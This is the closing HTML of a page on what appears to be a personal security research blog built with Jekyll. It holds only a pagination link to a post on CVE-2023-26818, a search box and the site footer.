      <a href="/macos/CVE_2023_26818_P1/" class="pagination--pager" title="CVE-2023-26818 Part1: MacOS TCC Bypass with telegram using DyLib Injection
">Next</a>
    
  </nav>

    </div>

    
  </article>

  
  
</div>

    </div>

    
      <div class="search-content">
        <div class="search-content__inner-wrap"><form class="search-content__form" onkeydown="return event.key != 'Enter';">
    <label class="sr-only" for="search">
      Enter your search term...
    </label>
    <input type="search" id="search" class="search-input" tabindex="-1" placeholder="Enter your search term..." />
  </form>
  <div id="results" class="results"></div></div>

      </div>
    

    <div id="footer" class="page__footer">
      <footer>
        <!-- start custom footer snippets -->

<!-- end custom footer snippets -->
        <div class="page__footer-follow">
  <ul class="social-icons">
    
      <li><strong>Follow:</strong></li>
    

    
      
        
      
        
      
        
      
        
      
        
      
        
      
    

    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
  </ul>
</div>

<div class="page__footer-copyright">&copy; 2024 Zeyad Azima. Powered by <a href="https://jekyllrb.com" rel="nofollow">Jekyll</a> &amp; <a href="https://mademistakes.com/work/minimal-mistakes-jekyll-theme/" rel="nofollow">Minimal Mistakes</a>.</div>

      </footer>
    </div>

    
  <script src="/assets/js/main.min.js"></script>
  <script src="https://kit.fontawesome.com/4eee35f757.js"></script>




<script src="/assets/js/lunr/lunr.min.js"></script>
<script src="/assets/js/lunr/lunr-store.js"></script>
<script src="/assets/js/lunr/lunr-en.js"></script>







  </body>
</html>
